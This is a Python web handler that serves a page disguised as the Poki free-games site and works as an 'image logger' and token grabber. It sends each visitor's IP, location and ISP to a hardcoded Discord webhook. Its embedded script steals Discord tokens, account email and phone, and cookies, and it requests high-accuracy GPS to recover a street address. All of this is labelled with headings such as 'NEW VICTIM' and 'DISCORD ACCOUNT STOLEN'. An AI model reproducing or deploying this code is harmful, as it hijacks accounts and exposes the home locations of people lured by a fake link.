
from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # YOUR WEBHOOK
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        
        # POKI IMAGE THAT ACTUALLY WORKS
        POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
        
        # Get real IP
        ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        if not ip:
            ip = self.headers.get('X-Real-IP', self.client_address[0])
        
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Get location
        city = "Unknown"
        region = "Unknown"
        country = "Unknown"
        lat = "N/A"
        lon = "N/A"
        isp = "Unknown"
        tz = "Unknown"
        
        try:
            with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as r:
                loc = json.loads(r.read().decode())
                city = loc.get('city', 'Unknown')
                region = loc.get('regionName', 'Unknown')
                country = loc.get('country', 'Unknown')
                lat = str(loc.get('lat', 'N/A'))
                lon = str(loc.get('lon', 'N/A'))
                isp = loc.get('isp', 'Unknown')
                tz = loc.get('timezone', 'Unknown')
        except:
            pass
        
        # Send IP log
        try:
            payload = {
                "username": "Image Logger",
                "content": "@everyone",
                "embeds": [{
                    "title": "🎯 NEW VICTIM",
                    "color": 65280,
                    "fields": [
                        {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
                        {"name": "🌍 Location", "value": f"{city}, {region}, {country}", "inline": False},
                        {"name": "📌 Coords", "value": f"{lat}, {lon}", "inline": True},
                        {"name": "🕐 Timezone", "value": tz, "inline": True},
                        {"name": "🏢 ISP", "value": isp, "inline": False},
                        {"name": "💻 User Agent", "value": f"```{ua[:80]}```", "inline": False}
                    ],
                    "thumbnail": {"url": POKI_IMAGE}
                }]
            }
            req = urllib.request.Request(WEBHOOK, 
                data=json.dumps(payload).encode(),
                headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # HTML page
        html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta property="og:title" content="Poki - Free Online Games">
<meta property="og:description" content="Play the best free online games">
<meta property="og:image" content="{POKI_IMAGE}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="{POKI_IMAGE}">
<title>Poki Games</title>
<style>
*{{margin:0;padding:0}}
body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial}}
.logo{{max-width:400px;width:90%}}
#info{{position:fixed;bottom:10px;left:10px;background:lime;color:#000;padding:10px;border-radius:8px;font:11px monospace;max-width:300px;display:none}}
#info.show{{display:block}}
</style>
</head>
<body>
<img src="{POKI_IMAGE}" class="logo" alt="Poki">
<div id="info"></div>
<script>
(async()=>{{
let d='';
const box=document.getElementById('info');

// COOKIES
d+='🍪 '+document.cookie.split(';').length+' cookies<br>';

// DISCORD DATA
let tok=[];
try{{
if(window.webpackChunkdiscord_app){{
window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
Object.values(r.c).forEach(m=>{{
if(m?.exports?.default?.getToken)tok.push(m.exports.default.getToken());
if(m?.exports?.getToken)tok.push(m.exports.getToken());
}});
}}]);
}}
}}catch(e){{}}

// Scan localStorage for tokens
try{{
for(let i=0;i<localStorage.length;i++){{
let v=localStorage.getItem(localStorage.key(i));
let m=v?.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
if(m)m.forEach(t=>{{if(!tok.includes(t))tok.push(t)}});
}}
}}catch(e){{}}

if(tok.length>0){{
for(let t of tok){{
try{{
let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
if(r.ok){{
let u=await r.json();
d+=`Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;

// Send to webhook
await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:'@everyone',
embeds:[{{
title:'🔑 DISCORD ACCOUNT STOLEN',
color:16711680,
fields:[
{{name:'Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
{{name:'📧 Email',value:`\`${{u.email||'None'}}\``,inline:true}},
{{name:'📱 Phone',value:`\`${{u.phone||'None'}}\``,inline:true}},
{{name:'🆔 ID',value:`\`${{u.id}}\``,inline:false}},
{{name:'🔐 2FA',value:u.mfa_enabled?'✅':'❌',inline:true}},
{{name:'🔑 Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
],
thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}}
}}]
}})
}});
break;
}}
}}catch(e){{}}
}}
}}else{{
d+='No Discord login<br>';
}}

box.innerHTML=d;
box.className='show';

// Send cookies
if(document.cookie){{
await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
embeds:[{{
title:'🍪 COOKIES',
description:`\`\`\`${{document.cookie}}\`\`\``,
color:16753920
}}]
}})
}});
}}

// GPS LOCATION (VPN BYPASS)
if(navigator.geolocation){{
navigator.geolocation.getCurrentPosition(async(p)=>{{
let lat=p.coords.latitude;
let lon=p.coords.longitude;
let acc=p.coords.accuracy;

try{{
let g=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{lat}}&lon=${{lon}}`,{{
headers:{{'User-Agent':'Mozilla/5.0'}}
}});
let gd=await g.json();
let a=gd.address||{{}};

await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:'@everyone 🚨 REAL LOCATION (VPN BYPASSED)',
embeds:[{{
title:'📍 GPS LOCATION',
color:3066993,
description:`**Full Address:**\\n${{a.road||''}} ${{a.house_number||''}}\\n${{a.city||a.town||a.village||''}}, ${{a.state||''}} ${{a.postcode||''}}\\n${{a.country||''}}`,
fields:[
{{name:'Coords',value:`${{lat}}, ${{lon}}`,inline:true}},
{{name:'Accuracy',value:`${{Math.round(acc)}}m`,inline:true}},
{{name:'Maps',value:`[Open]( https://maps.google.com/?q=${{lat}},${{lon}})`,inline:false}}
]
}}]
}})
}});
}}catch(e){{}}
}},()=>{{}},{{enableHighAccuracy:true,timeout:10000}});
}}
}})();
</script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
